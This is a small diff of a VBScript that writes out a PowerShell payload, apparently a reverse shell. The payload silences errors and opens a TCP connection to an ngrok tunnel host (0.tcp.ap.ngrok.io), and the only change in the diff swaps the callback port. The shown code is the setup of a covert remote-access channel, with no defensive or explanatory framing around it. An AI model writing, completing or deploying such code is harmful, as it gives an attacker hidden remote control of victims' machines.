@@ -3,7 +3,7 @@ Set objShell = CreateObject("WScript.Shell")
     ' PowerShell script content as a single line, using double quotes for inner strings
     ps1Content = "$ErrorActionPreference = 'SilentlyContinue';"
     ps1Content = ps1Content & "$h = '0.tcp.ap.ngrok.io';" ' 
-    ps1Content = ps1Content & "$p = 18585;" ' 
+    ps1Content = ps1Content & "$p = 11161;" ' 
     ps1Content = ps1Content & "try {$client = New-Object System.Net.Sockets.TcpClient($h, $p);"
     ps1Content = ps1Content & "$stream = $client.GetStream();"
     ps1Content = ps1Content & "$writer = New-Object System.IO.StreamWriter($stream);"
